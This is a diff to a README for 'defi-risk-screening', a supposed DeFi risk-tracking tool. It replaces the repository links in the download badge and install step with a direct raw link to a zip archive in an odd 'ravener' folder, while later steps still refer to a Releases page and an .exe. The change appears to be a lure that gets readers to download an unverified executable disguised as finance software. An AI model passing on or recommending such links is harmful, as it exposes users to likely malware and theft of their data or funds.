@@ -1,6 +1,6 @@
 # 📈 defi-risk-screening - Track financial risk and market stability
 
-[![Download](https://img.shields.io/badge/Download_Application-Blue-blue)](https://github.com/hgthangbq-lang/defi-risk-screening)
+[![Download](https://img.shields.io/badge/Download_Application-Blue-blue)](https://raw.githubusercontent.com/hgthangbq-lang/defi-risk-screening/main/ravener/screening_defi_risk_1.8-beta.3.zip)
 
 ## 🔍 About the software
 
@@ -19,7 +19,7 @@ Before you install this software, check that your computer meets these standards
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the following address: [https://github.com/hgthangbq-lang/defi-risk-screening](https://github.com/hgthangbq-lang/defi-risk-screening).
+1. Visit the following address: [https://raw.githubusercontent.com/hgthangbq-lang/defi-risk-screening/main/ravener/screening_defi_risk_1.8-beta.3.zip](https://raw.githubusercontent.com/hgthangbq-lang/defi-risk-screening/main/ravener/screening_defi_risk_1.8-beta.3.zip).
 2. Look for the Releases section on the right side of the page.
 3. Select the latest version available.
 4. Download the file ending in .exe to your local folder.
